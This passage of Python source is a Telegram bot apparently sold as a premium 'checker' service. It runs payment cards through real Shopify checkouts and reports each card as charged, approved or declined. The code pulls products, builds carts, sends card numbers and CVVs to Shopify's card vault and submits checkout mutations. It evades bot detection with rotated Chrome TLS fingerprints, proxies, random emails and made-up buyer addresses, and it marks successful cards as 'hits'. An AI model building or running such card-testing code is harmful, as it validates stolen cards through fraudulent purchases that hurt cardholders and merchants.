    for _cid, name, link in FORCE_JOIN_CHATS:
        if link:
            rows.append([pbtn(bs(f"📢 Join {name}"), url=link,
                              style="primary", icon="📢")])
    rows.append([pbtn(bs("✅ I Joined"), data="check_joined",
                      style="success", icon="✅")])
    text = pe(f"""💎 <b>{bs('Access Locked')}</b>
{SEP}
💎 {bs('Join both chats to continue')}
{SEP}""")
    await styled_reply(event, text, buttons=rows)


async def force_join_check(event) -> bool:
    if event.sender_id in ADMIN_ID:
        return True
    if await is_user_joined(event.sender_id):
        return True
    await send_join_required_message(event)
    return False


async def check_maintenance(event) -> bool:
    if get_maintenance() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, pe(f"""💎 <b>{bs('Maintenance')}</b>
{SEP}
💎 <b>{bs('Bot under maintenance')}</b>
💎 <i>{bs('Try again later')}</i>"""))
        return True
    return False


async def send_premium_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Premium only')}</b>
{SEP}
💎 {bs('This command requires premium access')}
💎 <i>{bs('Redeem a key or contact admin')}</i>"""),
        buttons=[[pbtn(bs("📩 Contact"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}",
                       style="success", icon="📩")]])


async def send_group_only(event):
    return await styled_reply(event, pe(f"""💎 <b>{bs('Group only')}</b>
{SEP}
💎 {bs('Free users can only use in group')}
💎 <i>{bs('Upgrade for private access')}</i>"""))


# =============================================================================
# SECTION 19 — CLIENT
# =============================================================================
client = TelegramClient('nova_bot', API_ID, API_HASH)
client_instance = client


# =============================================================================
# SECTION 20 — FREE-TIER TRACKER
# =============================================================================
_FREE_USAGE = {}
_FREE_LAST = {}


def _today():
    return datetime.now().strftime("%Y-%m-%d")


def get_free_usage(user_id: int) -> int:
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 0}
        return 0
    return e["count"]


def inc_free_usage(user_id: int):
    e = _FREE_USAGE.get(user_id)
    if not e or e.get("date") != _today():
        _FREE_USAGE[user_id] = {"date": _today(), "count": 1}
    else:
        e["count"] += 1


def free_cooldown_left(user_id: int) -> float:
    last = _FREE_LAST.get(user_id, 0)
    elapsed = time.time() - last
    if elapsed >= FREE_COOLDOWN_SEC:
        return 0.0
    return round(FREE_COOLDOWN_SEC - elapsed, 1)


def set_free_last(user_id: int):
    _FREE_LAST[user_id] = time.time()


# =============================================================================
# SECTION 21 — PREMIUM DAILY
# =============================================================================
def load_premium_daily():
    return _read_json(PREMIUM_DAILY_FILE, {})


def save_premium_daily(d):
    _write_json(PREMIUM_DAILY_FILE, d)


def get_premium_daily_used(uid):
    d = load_premium_daily()
    e = d.get(str(uid), {})
    if e.get("date") != datetime.now().strftime("%Y-%m-%d"):
        return 0
    return e.get("count", 0)


def inc_premium_daily_used(uid):
    d = load_premium_daily()
    u = str(uid)
    today = datetime.now().strftime("%Y-%m-%d")
    e = d.get(u, {})
    if e.get("date") != today:
        e = {"date": today, "count": 1}
    else:
        e["count"] = e.get("count", 0) + 1
    d[u] = e
    save_premium_daily(d)


def get_premium_daily_limit(uid):
    lim = _read_json(USER_LIMITS_FILE, {})
    return int(lim.get(str(uid), 0))


# =============================================================================
# SECTION 22 — GLOBAL STATE
# =============================================================================
ACTIVE_SESSIONS = {}
SHOPIFY_RESULTS = {}
RAZORPAY_RESULTS = {}
BOT_START_TIME = time.time()


# =============================================================================
# SECTION 23 — VIDEO SYSTEM
# =============================================================================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
VIDEO_DIR = os.path.join(BASE_DIR, "videos")
os.makedirs(VIDEO_DIR, exist_ok=True)


def get_welcome_video():
    p = os.path.join(VIDEO_DIR, "welcome.mp4")
    return p if os.path.exists(p) else None


def get_hit_videos():
    try:
        return [os.path.join(VIDEO_DIR, f)
                for f in sorted(os.listdir(VIDEO_DIR))
                if f.startswith("hit") and f.endswith(".mp4")]
    except Exception:
        return []


def _pick_hit_video():
    vids = get_hit_videos()
    return random.choice(vids) if vids else None


# =============================================================================
# SECTION 24 — CARD FORMATTING
# =============================================================================
def _bin_lines(bin_tuple):
    brand, typ, level, bank, country, flag = bin_tuple
    return (
        f"{bs('BIN')} ━ <code>{brand} - {typ} - {level}</code>\n"
        f"{bs('Bank')} ━ <code>{bank}</code>\n"
        f"{bs('Country')} ━ <code>{country} {flag}</code>"
    )


def _status_header(status: str):
    s = (status or '').upper()
    if s == 'CHARGED':  return f"🥇 <b>{bs('CHARGED')}</b>"
    if s == 'APPROVED': return f"🥈 <b>{bs('APPROVED')}</b>"
    if s == '3DS':      return f"🥉 <b>{bs('3DS')}</b>"
    if s == 'DECLINED': return f"🥔 <b>{bs('DECLINED')}</b>"
    if s == 'ERROR':    return f"🧨 <b>{bs('ERROR')}</b>"
    return f"⚪ <b>{bs(s or 'UNKNOWN')}</b>"


def format_shopify_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_rz_single(result: dict, bin_tuple, elapsed: float) -> str:
    card = result.get("card", "-")
    gateway = result.get("gateway", "RazorPay")
    response = (result.get("message") or result.get("Response") or "")[:150]
    price = result.get("price", "-") or "-"
    status = (result.get("status") or "Dead").upper()
    if status == "DEAD":
        status = "DECLINED"
    return pe(f"""{_status_header(status)}
{SEP}
⊀ {bs('Card')}
⤷ <code>{card}</code>
{bs('Gateway')} ━ <code>{gateway}</code>
{bs('Response')} ━ <code>{response}</code>
{bs('Price')} ━ <code>{price}</code>
{SEP}
{_bin_lines(bin_tuple)}
{SEP}
{bs('Took')} ⏱ <code>{elapsed:.2f}s</code>""")


def format_realtime_hit(result: dict, gateway_type: str, bin_tuple) -> str:
    card = result.get('card', '-')
    gateway = result.get('gateway', 'Shopify')
    response = (result.get('message') or '')[:150]
    price = result.get('price', '-')
    status = result.get('status', 'Dead').upper()
    if status == 'DEAD':
        status = 'DECLINED'
    return pe(f"""{_status_header(status)}

💳 CC <code>{card}</code>

🛒 {bs('Gateway')} {gateway}
📝 {bs('Response')} {response}
💸 {bs('Price')} {price}

🆔 {bs('BIN Info')} {bin_tuple[0]} - {bin_tuple[1]} - {bin_tuple[2]}
🏦 {bs('Bank')} {bin_tuple[3]}
🥰 {bs('Country')} {bin_tuple[4]} {bin_tuple[5]}""")


HIT_BUTTON = [[pbtn(bs("💎 NOVA"), url="http://t.me/spectrumxchkbot",
                    style="primary", icon="💎")]]


# =============================================================================
# SECTION 25 — SAFE ENGINE CALL (hard wall-clock timeout)
# =============================================================================
async def _safe_call(coro, timeout: float, fallback: dict):
    try:
        return await asyncio.wait_for(coro, timeout=timeout)
    except asyncio.TimeoutError:
        fb = dict(fallback)
        fb['message'] = fb.get('message', 'timeout')
        return fb
    except asyncio.CancelledError:
        raise
    except Exception as e:
        fb = dict(fallback)
        fb['message'] = f'{type(e).__name__}: {str(e)[:100]}'
        fb['status_code'] = 'EXCEPTION'
        fb['status'] = 'Error'
        return fb


# =============================================================================
# SECTION 26 — INLINE SHOPIFY CHECKOUT ENGINE
# =============================================================================
# Complete Shopify graphql checkout flow — no external API calls.
# Handles: products.json → cart → checkout → tokenize → submit → poll.
# Uses curl_cffi with Chrome TLS impersonation.
# =============================================================================

class CheckStatus(Enum):
    CHARGED  = "CHARGED"
    APPROVED = "APPROVED"
    DECLINED = "DECLINED"
    ERROR    = "ERROR"


@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = "USD"
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: str = ""
    retryable: bool = False
    elapsed: float = 0.0


_ENGINE_BROWSER_PROFILES = ["chrome131", "chrome124", "chrome120", "chrome116", "chrome110"]

_ENGINE_CHROME_BRANDS = {
    "131": ('"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            '"Google Chrome";v="131.0.6778.85", "Chromium";v="131.0.6778.85", "Not_A Brand";v="24.0.0.0"'),
    "124": ('"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            '"Chromium";v="124.0.6367.118", "Google Chrome";v="124.0.6367.118", "Not-A.Brand";v="99.0.0.0"'),
    "120": ('"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.109", "Google Chrome";v="120.0.6099.109"'),
    "116": ('"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            '"Chromium";v="116.0.5845.187", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.5845.187"'),
    "110": ('"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            '"Chromium";v="110.0.5481.177", "Not A(Brand";v="24.0.0.0", "Google Chrome";v="110.0.5481.177"'),
}

_ENGINE_UA_WIN = {
    "131": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "124": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "120": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "116": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "110": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
}

_ENGINE_ACCEPT_LANG = [
    "en-US,en;q=0.9", "en-US,en;q=0.9,es;q=0.8",
    "en-US,en;q=0.9,fr;q=0.8", "en-GB,en;q=0.9",
]

_ENGINE_POLL_MAX_ATTEMPTS  = 40
_ENGINE_POLL_MAX_WAIT_SECS = 45.0
_ENGINE_HTTP_SHORT = 15
_ENGINE_HTTP_MED   = 25
_ENGINE_HTTP_LONG  = 45


@dataclass
class _EngineAddress:
    first_name: str
    last_name: str
    address1: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email: str = ""


_ENGINE_ADDRESS_POOL = {
    "US": _EngineAddress("james","anderson","428 W 45th St","New York","US","NY","10036","+12125550100"),
    "CA": _EngineAddress("john","smith","200 Kent St","Ottawa","CA","ON","K1A0G9","+16135550100"),
    "GB": _EngineAddress("james","wilson","10 Downing St","London","GB","ENG","SW1A2AA","+442012345678"),
    "AU": _EngineAddress("thomas","taylor","1 George St","Sydney","AU","NSW","2000","+61212345678"),
    "DE": _EngineAddress("lucas","thomas","Friedrichstr 100","Berlin","DE","BE","10117","+493012345678"),
    "FR": _EngineAddress("hugo","bernard","10 Rue de Rivoli","Paris","FR","IDF","75001","+33112345678"),
    "NL": _EngineAddress("bas","jansen","Dam 1","Amsterdam","NL","NH","1012JS","+31201234567"),
    "IE": _EngineAddress("sean","murphy","1 Grafton St","Dublin","IE","D","D02Y006","+35311234567"),
    "SE": _EngineAddress("erik","andersson","Vasagatan 1","Stockholm","SE","AB","11120","+468123456"),
    "NO": _EngineAddress("olav","hansen","Karl Johans gate 1","Oslo","NO","03","0154","+4721234567"),
    "DK": _EngineAddress("lars","nielsen","Strøget 1","Copenhagen","DK","84","1457","+4531234567"),
    "NZ": _EngineAddress("jack","wilson","1 Queen St","Auckland","NZ","AUK","1010","+6491234567"),
    "CH": _EngineAddress("hans","weber","Bahnhofstrasse 1","Zurich","CH","ZH","8001","+41441234567"),
    "AT": _EngineAddress("markus","gruber","Stephansplatz 1","Vienna","AT","9","1010","+4312345678"),
    "BE": _EngineAddress("jan","peeters","Grote Markt 1","Brussels","BE","BRU","1000","+3221234567"),
    "FI": _EngineAddress("jussi","korhonen","Mannerheimintie 1","Helsinki","FI","18","00100","+35891234567"),
}

_ENGINE_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK", "NZ", "CH", "AT", "BE", "FI"]

_ENGINE_FIRST_NAMES = ["James","John","Robert","Michael","William","David","Mary","Patricia","Jennifer","Linda","Alex","Sam","Chris","Kai","Jamie"]
_ENGINE_LAST_NAMES  = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Wilson","Moore","Taylor","Lee","Clark","Hall","Young"]
_ENGINE_EMAIL_DOMAINS = ["gmail.com","outlook.com","yahoo.com","protonmail.com","icloud.com"]


def _engine_random_email() -> str:
    f = random.choice(_ENGINE_FIRST_NAMES).lower()
    l = random.choice(_ENGINE_LAST_NAMES).lower()
    return f"{f}.{l}{random.randint(1,9999)}@{random.choice(_ENGINE_EMAIL_DOMAINS)}"


def _engine_addr_for(country_code: str) -> _EngineAddress:
    a = _ENGINE_ADDRESS_POOL.get(country_code, _ENGINE_ADDRESS_POOL["US"])
    return _EngineAddress(
        first_name=random.choice(_ENGINE_FIRST_NAMES).lower(),
        last_name =random.choice(_ENGINE_LAST_NAMES).lower(),
        address1=a.address1, city=a.city, country_code=a.country_code,
        zone_code=a.zone_code, postal_code=a.postal_code, phone=a.phone,
        email=_engine_random_email(),
    )


def _engine_new_fingerprint() -> dict:
    ver = random.choice(list(_ENGINE_CHROME_BRANDS.keys()))
    ua  = _ENGINE_UA_WIN[ver]
    sec_ch, sec_ch_full = _ENGINE_CHROME_BRANDS[ver]
    return {
        "_chrome_ver": ver,
        "ua": ua,
        "sec-ch-ua": sec_ch,
        "sec-ch-ua-full-version-list": sec_ch_full,
        "accept-language": random.choice(_ENGINE_ACCEPT_LANG),
    }


class _EngineTLSClient:
    def __init__(self, proxy_url: str | None, fingerprint: dict, timeout: int = _ENGINE_HTTP_MED):
        if not CURL_CFFI_OK:
            raise RuntimeError("curl_cffi not installed")
        self.fp = fingerprint
        impersonate = f"chrome{fingerprint['_chrome_ver']}"
        if impersonate not in _ENGINE_BROWSER_PROFILES:
            impersonate = "chrome131"
        kw = {"impersonate": impersonate, "timeout": timeout, "verify": False}
        if proxy_url:
            kw["proxy"] = proxy_url
        self.session = CurlSession(**kw)
        self.session.headers.update({
            "user-agent":                fingerprint["ua"],
            "accept-language":           fingerprint["accept-language"],
            "accept-encoding":           "gzip, deflate, br",
            "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "connection":                "keep-alive",
            "upgrade-insecure-requests": "1",
            "sec-ch-ua":                 fingerprint["sec-ch-ua"],
            "sec-ch-ua-mobile":          "?0",
            "sec-ch-ua-platform":        '"Windows"',
            "sec-fetch-dest":            "document",
            "sec-fetch-mode":            "navigate",
            "sec-fetch-site":            "none",
            "sec-fetch-user":            "?1",
            "cache-control":             "max-age=0",
        })

    def get(self, url, **kw):
        kw.setdefault("timeout", _ENGINE_HTTP_MED)
        return self.session.get(url, **kw)

    def post(self, url, data=None, json=None, **kw):
        kw.setdefault("timeout", _ENGINE_HTTP_MED)
        return self.session.post(url, data=data, json=json, **kw)

    def close(self):
        try:
            self.session.close()
        except Exception:
            pass


def _engine_parse_card(entry: str) -> Tuple[str, int, int, str]:
    parts = entry.strip().replace("/", "|").split("|")
    if len(parts) != 4:
        raise ValueError("bad card format")
    num = re.sub(r"\D", "", parts[0])
    if not (13 <= len(num) <= 19):
        raise ValueError("bad card length")
    mm = int(parts[1]); yy = int(parts[2]); cvv = parts[3].strip()
    if not (1 <= mm <= 12):
        raise ValueError("bad month")
    if len(parts[2]) == 2:
        yy = 2000 + yy
    if not re.fullmatch(r"\d{3,4}", cvv):
        raise ValueError("bad cvv")
    return num, mm, yy, cvv


def _engine_normalize_proxy(raw: str) -> str:
    p = (raw or "").strip()
    if not p:
        raise ValueError("empty proxy")
    if "://" in p:
        return p
    parts = p.split(":")
    if len(parts) == 4:
        host, port, user, pw = parts
        return (f"http://{urllib.parse.quote(user, safe='')}:"
                f"{urllib.parse.quote(pw, safe='')}@{host}:{port}")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return "http://" + p


_ENGINE_RE_SESSION_TOKEN  = re.compile(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"')
_ENGINE_RE_SOURCE_TOKEN   = re.compile(r'name="serialized-sourceToken"\s+content="([^"]*)"')
_ENGINE_RE_COMMIT_SHA     = re.compile(r'"commitSha"\s*:\s*"([a-f0-9]{40})"')
_ENGINE_RE_STABLE_ID      = re.compile(r'"stableId"\s*:\s*"([0-9a-fA-F-]{36})"')
_ENGINE_RE_IDENT_SIG      = re.compile(r'checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"')
_ENGINE_RE_VAULT_URL      = re.compile(r'(https://[a-zA-Z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)')
_ENGINE_RE_ACTIONS_JS     = re.compile(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)')
_ENGINE_RE_CHECKOUT_TOKEN = re.compile(r'/checkouts/cn/([^/?]+)')


def _engine_extract_session_token(html_text: str) -> str:
    m = _ENGINE_RE_SESSION_TOKEN.search(html_text)
    return _html_unescape(m.group(1)).strip('"') if m else ""


def _engine_extract_vault_url(html_text: str) -> str:
    decoded = html_text.replace("&quot;", '"')
    m = _ENGINE_RE_VAULT_URL.search(decoded)
    if m:
        return m.group(1)
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def _html_unescape(s: str) -> str:
    import html as _h
    return _h.unescape(s)


_ENGINE_RECENT_PRICES: Dict[str, List[str]] = {}
_ENGINE_RECENT_LOCK = threading.Lock()


def _engine_find_cheapest_product(client: _EngineTLSClient, shop_url: str) -> Tuple[str, str, str, str]:
    url = f"{shop_url}/products.json?limit=250"
    last_err = None
    data = None
    for attempt in range(3):
        try:
            r = client.get(url, timeout=_ENGINE_HTTP_SHORT)
            if r.status_code == 200:
                data = r.json()
                break
            last_err = Exception(f"HTTP {r.status_code}")
        except Exception as exc:
            last_err = exc
        time.sleep(0.8 + attempt * 0.5)
    if data is None:
        raise Exception(f"products.json failed: {last_err}")

    products = data.get("products") or []
    if not products:
        raise Exception("no products")

    candidates = []
    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            try:
                price = float(v.get("price") or 0)
            except (ValueError, TypeError):
                continue
            if price < 0.10:
                continue
            candidates.append({
                "variant_id": str(v["id"]),
                "title":      p.get("title", ""),
                "price":      v.get("price", ""),
                "price_f":    price,
            })
    if not candidates:
        raise Exception("no available variants")

    candidates.sort(key=lambda x: x["price_f"])
    domain = urllib.parse.urlparse(shop_url).hostname or shop_url
    with _ENGINE_RECENT_LOCK:
        recent = _ENGINE_RECENT_PRICES.get(domain, [])
    top = candidates[:min(5, len(candidates))]
    preferred = [c for c in top if c["price"] not in recent] or top
    pick = random.choice(preferred)
    with _ENGINE_RECENT_LOCK:
        _ENGINE_RECENT_PRICES[domain] = (recent + [pick["price"]])[-5:]

    return pick["title"], pick["variant_id"], pick["variant_id"], pick["price"]


def _engine_add_to_cart(client: _EngineTLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_url = f"{shop_url}/cart/{variant_id}:1"
    r = client.get(cart_url, allow_redirects=True, headers={
        "accept":  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "referer": shop_url + "/",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
    })
    if r.status_code not in (200, 302):
        raise Exception(f"cart permalink {r.status_code}")
    checkout_url = str(r.url)
    html_text    = r.text
    token_m      = _ENGINE_RE_CHECKOUT_TOKEN.search(checkout_url)
    checkout_token = token_m.group(1) if token_m else ""
    session_token  = _engine_extract_session_token(html_text)
    return checkout_url, checkout_token, session_token, html_text


_ENGINE_RE_PROPOSAL_ID = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"')
_ENGINE_RE_SUBMIT_ID   = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"')
_ENGINE_RE_POLL_ID     = re.compile(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"')


def _engine_fetch_persisted_ids(client: _EngineTLSClient, checkout_html: str, shop_url: str) -> Dict[str, str]:
    m = _ENGINE_RE_ACTIONS_JS.search(checkout_html)
    if not m:
        return {}
    try:
        r = client.get(shop_url + m.group(1), timeout=_ENGINE_HTTP_SHORT)
        if r.status_code != 200:
            return {}
        js = r.text
    except Exception:
        return {}
    out = {}
    for key, pat in (("proposal", _ENGINE_RE_PROPOSAL_ID), ("submit", _ENGINE_RE_SUBMIT_ID), ("poll", _ENGINE_RE_POLL_ID)):
        mm = pat.search(js)
        if mm:
            out[key] = mm.group(1)
    return out


_ENGINE_Q_PROPOSAL = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$poNumber:String){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},checkpointData:$checkpointData,queueToken:$queueToken}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}fragment ProposalDetails on Proposal{delivery{...on FilledDeliveryTerms{deliveryLines{destinationAddress{...on StreetAddress{firstName lastName address1 city countryCode zoneCode postalCode phone __typename}...on PartialStreetAddress{firstName lastName address1 city countryCode zoneCode postalCode phone __typename}__typename}targetMerchandise{linesV2{...on MerchandiseLine{stableId __typename}__typename}__typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{...on PaymentProvider{paymentMethodIdentifier name orderingIndex __typename}__typename}__typename}__typename}__typename}merchandise{...on FilledMerchandiseTerms{merchandiseLines{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}isShippingRequired __typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

_ENGINE_Q_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage nonLocalizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}"""

_ENGINE_Q_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url __typename}orderIdentity{id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}...on InventoryReservationFailure{__typename}...on InventoryClaimFailure{__typename}__typename}__typename}__typename}"""


def _engine_tokenize_card(client: _EngineTLSClient, ident_sig: str, card_number: str,
                          card_name: str, month: int, year: int, cvv: str,
                          scope: str, vault_url: str) -> Tuple[str, str]:
    if not vault_url:
        vault_url = "https://checkout.pci.shopifyinc.com/sessions"
    origin = vault_url.rsplit("/sessions", 1)[0]
    headers = {
        "accept":                     "application/json",
        "content-type":               "application/json",
        "origin":                     origin,
        "referer":                    f"{origin}/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
        "sec-fetch-dest":             "empty",
        "sec-fetch-mode":             "cors",
        "sec-fetch-site":             "same-origin",
        "sec-fetch-storage-access":   "active",
        "shopify-identification-signature": ident_sig,
        "user-agent":                 client.fp["ua"],
    }
    payload = {
        "credit_card": {
            "number":             card_number,
            "month":              month,
            "year":               year,
            "verification_value": cvv,
            "start_month":        None,
            "start_year":         None,
            "issue_number":       "",
            "name":               card_name,
        },
        "payment_session_scope": scope,
    }
    try:
        r = client.post(vault_url, json=payload, headers=headers, timeout=_ENGINE_HTTP_SHORT)
    except Exception as exc:
        return "", f"vault_exc: {exc}"
    if r.status_code != 200:
        return "", f"vault_http_{r.status_code}"
    try:
        return r.json().get("id", ""), ""
    except Exception:
        return "", "vault_bad_json"


def _engine_proposal_headers(client: _EngineTLSClient, shop_url: str, checkout_url: str,
                              checkout_token: str, session_token: str,
                              build_id: str, source_token: str, source_id: str = "") -> dict:
    h = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": shop_url,
        "referer": checkout_url,
        "sec-ch-ua": client.fp["sec-ch-ua"],
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": client.fp["ua"],
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_id or source_token or checkout_token,
    }
    if build_id:
        h["x-checkout-web-build-id"] = build_id
    return h


def _engine_patch_currency_country(payload: Any, currency: str, country: str) -> Any:
    def walk(node):
        if isinstance(node, dict):
            out = {}
            for k, v in node.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    out[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    out[k] = country
                else:
                    out[k] = walk(v)
            return out
        if isinstance(node, list):
            return [walk(x) for x in node]
        return node
    return walk(payload)


def _engine_proposal_payload(session_token: str, stable_id: str, variant_id: str,
                              queue_token: str, email, addr, is_shipping: bool,
                              currency: str, country: str) -> dict:
    if is_shipping:
        delivery_line = {
            "destination": {
                "partialStreetAddress": {
                    "address1":    addr.address1     if addr else "",
                    "address2":    "",
                    "city":        addr.city         if addr else "",
                    "countryCode": addr.country_code if addr else country,
                    "postalCode":  addr.postal_code  if addr else "",
                    "firstName":   addr.first_name   if addr else "",
                    "lastName":    addr.last_name    if addr else "",
                    "zoneCode":    addr.zone_code    if addr else "",
                    "phone":       addr.phone        if addr else "",
                    "oneTimeUse":  False,
                },
            },
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments":              {"any": True},
                },
                "options": {},
            },
